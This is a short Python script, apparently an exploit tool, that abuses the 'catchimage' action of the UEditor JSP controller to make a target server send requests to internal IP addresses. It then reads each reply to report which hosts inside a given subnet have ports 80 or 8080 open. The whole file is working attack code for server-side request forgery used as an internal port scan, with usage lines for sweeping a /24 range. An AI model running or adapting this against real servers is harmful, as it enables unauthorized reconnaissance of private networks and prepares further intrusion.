__Date__="20180524"


'''
Usage:
    python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133
	python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24
	
Python version: 3.6.2
requirements:IPy==0.83

'''
import sys
import json
import requests
from IPy import IP


def check(url,ip,port):
	url = '%s/jsp/controller.jsp?action=catchimage&source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png' % (url,ip,port)
	res = requests.get(url)
	result = res.text
	# print(url,result)
	result = result.replace("list","\"list\"")
	res_json = json.loads(result)
	state = res_json['list'][0]['state']
	if state == '远程连接出错' or state == 'SUCCESS':
		print(ip,port,'is Open')

def main(url,ip):

	ips = IP(ip)
	ports = [80,8080]
	for i in ips:
		for port in ports:
			check(url,i,port)
if __name__ == '__main__':
	url = sys.argv[1]
	ip = sys.argv[2]
	main(url,ip)